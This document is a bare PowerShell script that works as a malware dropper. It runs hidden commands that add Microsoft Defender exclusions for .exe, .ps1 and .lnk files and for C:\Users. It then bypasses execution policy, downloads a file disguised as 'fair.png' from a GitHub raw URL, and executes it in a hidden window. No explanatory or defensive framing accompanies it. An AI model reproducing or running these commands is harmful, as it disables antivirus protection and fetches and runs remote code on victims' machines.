powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/fair.png -o C:\Users\fair.png

powershell.exe -w Hidden C:\Users\fair.png
